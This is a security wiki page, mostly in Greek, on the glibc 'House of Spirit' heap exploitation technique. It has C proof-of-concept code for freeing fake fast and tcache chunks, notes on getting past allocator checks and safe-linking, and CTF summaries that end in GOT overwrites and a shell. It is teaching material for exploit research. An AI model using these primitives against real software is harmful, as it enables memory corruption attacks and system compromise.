# House of Spirit

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

### Κώδικας

<details>

<summary>House of Spirit</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### Στόχος

- Να μπορείτε να προσθέσετε στη tcache / fast bin μια διεύθυνση ώστε αργότερα να είναι δυνατή η κατανομή της

### Απαιτήσεις

- Αυτή η επίθεση απαιτεί ο επιτιθέμενος να μπορεί να δημιουργήσει μερικά fake fast chunks που να δηλώνουν σωστά την τιμή του size και στη συνέχεια να μπορεί να free το πρώτο fake chunk ώστε να μπει στο bin.
- Με **tcache (glibc ≥2.26)** η επίθεση είναι ακόμα πιο απλή: χρειάζεται μόνο ένα fake chunk (δεν πραγματοποιείται έλεγχος next-chunk size στην tcache διαδρομή) εφόσον το fake chunk είναι 0x10-aligned και το πεδίο size του ανήκει σε ένα έγκυρο tcache bin (0x20-0x410 σε x64).

### Επίθεση

- Δημιουργήστε fake chunks που παρακάμπτουν τους ελέγχους ασφάλειας: θα χρειαστείτε ουσιαστικά 2 fake chunks που δηλώνουν στις σωστές θέσεις τα σωστά size
- Με κάποιον τρόπο καταφέρετε να free το πρώτο fake chunk ώστε να μπει στο fast ή tcache bin και στη συνέχεια να γίνει allocate για να overwrite εκείνη τη διεύθυνση

**The code from** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **is great to understand the attack.** Αν και αυτό το σχήμα από τον κώδικα το συνοψίζει πολύ καλά:

<details>
<summary>Διάταξη fake chunk</summary>
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
</details>

> [!TIP]
> Σημειώστε ότι είναι απαραίτητο να δημιουργήσετε το δεύτερο chunk προκειμένου να παρακάμψετε κάποιους ελέγχους εγκυρότητας.

### Tcache house of spirit (glibc ≥2.26)

- Σε σύγχρονη glibc το **tcache fast-path** καλεί `tcache_put` πριν επικυρώσει το μέγεθος του επόμενου chunk/`prev_inuse`, οπότε μόνο το τρέχον fake chunk πρέπει να φαίνεται έγκυρο.
- Απαιτήσεις:
- Το fake chunk πρέπει να είναι **ευθυγραμμισμένο σε 16 bytes** και να μην φέρει την επισήμανση `IS_MMAPPED`/`NON_MAIN_ARENA`.
- Το `size` πρέπει να ανήκει σε tcache bin και να περιλαμβάνει το **prev_inuse bit set** (`size | 1`).
- Το tcache για αυτό το bin δεν πρέπει να είναι γεμάτο (default max 7 entries).
- Ελάχιστο PoC (stack chunk):
```c
unsigned long long fake[6] __attribute__((aligned(0x10)));
// chunk header at fake[0]; usable data starts at fake+2
fake[1] = 0x41;              // fake size (0x40 bin, prev_inuse=1)
void *p = &fake[2];          // points inside fake chunk
free(p);                     // goes straight into tcache
void *q = malloc(0x30);      // returns stack address fake+2
```
- **Safe-linking** δεν αποτελεί εμπόδιο εδώ: ο forward pointer που αποθηκεύεται στο tcache κωδικοποιείται αυτόματα ως `fd = ptr ^ (heap_base >> 12)` κατά το `free`, οπότε ο attacker δεν χρειάζεται να γνωρίζει το κλειδί όταν χρησιμοποιεί ένα μόνο fake chunk.
- Αυτή η παραλλαγή είναι χρήσιμη όταν οι glibc hooks έχουν αφαιρεθεί (≥2.34) και θέλεις ένα γρήγορο arbitrary write ή να επικαλύψεις έναν target buffer (π.χ., stack/BSS) με ένα tcache chunk χωρίς να δημιουργήσεις επιπλέον corruptions.

## Examples

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc infoleak**: Μέσω ενός overflow είναι δυνατό να αλλάξεις έναν pointer ώστε να δείχνει σε μια GOT διεύθυνση για να leak-άρεις μια libc διεύθυνση μέσω της read ενέργειας του CTF
- **House of Spirit**: Κακοποιώντας έναν counter που μετράει τον αριθμό των "rifles" είναι δυνατόν να δημιουργηθεί ένα fake size για το πρώτο fake chunk, έπειτα κακοποιώντας ένα "message" είναι δυνατό να πλαστογραφήσουμε το δεύτερο size ενός chunk και τελικά κακοποιώντας ένα overflow είναι δυνατό να αλλαχτεί ένας pointer που πρόκειται να γίνει freed ώστε το πρώτο μας fake chunk να γίνει freed. Έπειτα, μπορούμε να το allocate και μέσα του θα υπάρχει η διεύθυνση όπου αποθηκεύεται το "message". Έπειτα, είναι δυνατό να το δείξουμε στο `scanf` entry μέσα στον GOT πίνακα, ώστε να το overwrite-άρουμε με τη διεύθυνση προς system.\
Την επόμενη φορά που θα κληθεί το `scanf`, μπορούμε να στείλουμε το input `"/bin/sh"` και να πάρουμε ένα shell.

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc leak**: Μη αρχικοποιημένο stack buffer.
- **House of Spirit**: Μπορούμε να τροποποιήσουμε τον πρώτο δείκτη ενός global array από heap pointers. Με μία single byte τροποποίηση, χρησιμοποιούμε το `free` σε ένα fake chunk μέσα σε ένα έγκυρο chunk, έτσι ώστε να έχουμε overlapping chunks κατάσταση μετά το allocate ξανά. Με αυτό, μια απλή Tcache poisoning attack δουλεύει για να αποκτήσουμε ένα arbitrary write primitive.

## References

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)
- [https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c)

{{#include ../../banners/hacktricks-training.md}}
